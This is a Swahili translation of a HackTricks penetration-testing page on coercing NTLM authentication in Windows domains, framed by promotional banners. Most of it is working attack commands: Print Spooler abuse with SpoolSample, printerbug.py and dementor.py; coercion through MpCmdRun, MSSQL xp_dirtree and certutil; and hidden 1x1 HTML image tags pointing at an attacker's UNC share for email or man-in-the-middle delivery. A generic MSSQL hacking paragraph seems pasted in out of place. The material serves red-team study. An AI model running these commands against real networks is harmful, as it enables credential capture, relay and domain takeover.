# Kulazimisha Uthibitisho wa NTLM wa Uthibitishaji

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **vichocheo vya uthibitishaji wa mbali** vilivyoandikwa kwa C# kwa kutumia kisimbiko cha MIDL ili kuepuka kutegemea programu ya tatu.

## Matumizi Mabaya ya Huduma ya Spooler

Ikiwa huduma ya _**Print Spooler**_ ime **wezeshwa,** unaweza kutumia baadhi ya vitambulisho vya AD vilivyofahamika tayari kuomba kwa mwenyeji wa udhibiti wa kikoa sasisho kuhusu kazi mpya za uchapishaji na tuambie itume arifa kwa mfumo fulani.\
Kumbuka wakati printer inatuma arifa kwa mifumo isiyojulikana, inahitaji **kuthibitisha** dhidi ya **mfumo** huo. Kwa hivyo, mshambuliaji anaweza kufanya huduma ya _**Print Spooler**_ kuthibitisha dhidi ya mfumo usiojulikana, na huduma hiyo itatumia akaunti ya kompyuta katika uthibitisho huu.

### Kupata Seva za Windows kwenye kikoa

Kwa kutumia PowerShell, pata orodha ya sanduku za Windows. Seva kawaida ni kipaumbele, kwa hivyo tuangalie hapo:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Kupata huduma za Spooler zinazosikiliza

Kwa kutumia @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) iliyobadilishwa kidogo, angalia ikiwa Huduma ya Spooler inasikiliza:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Unaweza pia kutumia rpcdump.py kwenye Linux na kutafuta Itifaki ya MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Uliza huduma kujithibitisha dhidi ya mwenyeji wowote

Unaweza kuunda [**SpoolSample kutoka hapa**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
au tumia [**dementor.py** ya 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa unatumia Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kuchanganya na Uteuzi Usiozuiliwa

Ikiwa mshambuliaji tayari amefanikiwa kudukua kompyuta na [Uteuzi Usiozuiliwa](unconstrained-delegation.md), mshambuliaji anaweza **kuwezesha printer kuthibitisha dhidi ya kompyuta hii**. Kwa sababu ya uteuzi usiozuiliwa, **TGT** ya **akaunti ya kompyuta ya printer** itahifadhiwa **katika kumbukumbu** ya kompyuta yenye uteuzi usiozuiliwa. Kwa kuwa mshambuliaji tayari amedukua mwenyeji huu, ataweza **kupata tiketi hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).

## Uthibitishaji wa RCP kwa nguvu

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika kipengele cha **PushSubscription cha Seva ya Kubadilishana**. Kipengele hiki kinawezesha seva ya Kubadilishana kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote uliowekwa na mteja kupitia HTTP.

Kwa chaguo-msingi, **huduma ya Kubadilishana inaendeshwa kama SYSTEM** na inapewa mamlaka ya ziada (hasa, ina **mamlaka ya WriteDacl kwenye kiwango cha kikoa kabla ya Sasisho la Kumulati la 2019**). Kasoro hii inaweza kutumiwa kuwezesha **kuhamisha habari kwa LDAP na kisha kuchota hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kuhamisha kwa LDAP sio rahisi, kasoro hii bado inaweza kutumika kuhamisha na kuthibitisha kwa wenyewe kwenye mwenyeji mwingine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa moja kwa moja kwa Msimamizi wa Kikoa na akaunti yoyote ya mtumiaji wa kikoa iliyothibitishwa.

## Ndani ya Windows

Ikiwa tayari umo ndani ya kompyuta ya Windows, unaweza kulazimisha Windows kuunganisha kwenye seva kwa kutumia akaunti zenye mamlaka kwa:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL ni mfumo wa usimamizi wa database uliotengenezwa na Microsoft. Inatumika sana katika mazingira ya biashara kwa kuhifadhi na kusimamia data. Kwa sababu ya umaarufu wake, MSSQL mara nyingi hulengwa na wadukuzi kwa sababu ya uwezekano wa kupata data nyeti.

Kuna njia kadhaa za kudukua MSSQL, ikiwa ni pamoja na:

1. **Brute forcing**: Kudukua nywila za akaunti za MSSQL kwa kujaribu nywila nyingi hadi kupata ile sahihi.
2. **SQL injection**: Kuingiza maagizo ya SQL yasiyofaa katika maombi yanayotumia MSSQL, ambayo inaweza kusababisha kufichuliwa kwa data nyeti au hata kudhibitiwa kwa seva.
3. **Exploiting vulnerabilities**: Kutumia udhaifu katika programu ya MSSQL ili kupata ufikiaji usioidhinishwa au kudhibiti seva.
4. **Default credentials**: Kujaribu kuingia kwenye seva ya MSSQL kwa kutumia nywila za chaguo-msingi ambazo mara nyingi haziwekwi na watumiaji.

Ni muhimu kwa wamiliki wa seva za MSSQL kuchukua hatua za usalama ili kuzuia mashambulizi haya. Hii inaweza kujumuisha kuanzisha nywila ngumu, kusasisha programu na kurekebisha udhaifu, na kufuatilia shughuli za seva kwa dalili za shughuli za kudukua.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Au tumia mbinu hii nyingine: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Inawezekana kutumia certutil.exe lolbin (faili iliyosainiwa na Microsoft) kuchochea uthibitishaji wa NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Uingizaji wa HTML

### Kupitia barua pepe

Ikiwa unajua **anwani ya barua pepe** ya mtumiaji anayeingia kwenye kifaa unachotaka kudukua, unaweza tu kumtumia **barua pepe yenye picha ya 1x1** kama vile
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
na wakati anapofungua, atajaribu kujithibitisha.

### MitM

Ikiwa unaweza kufanya shambulio la MitM kwa kompyuta na kuingiza HTML katika ukurasa ambao atauona, unaweza kujaribu kuingiza picha kama ifuatavyo katika ukurasa:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Kuvunja NTLMv1

Ikiwa unaweza kukamata changamoto za NTLMv1 [soma hapa jinsi ya kuzivunja](../ntlm/#ntlmv1-attack).\
_Kumbuka kwamba ili kuvunja NTLMv1 unahitaji kuweka changamoto ya Responder kuwa "1122334455667788"_

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
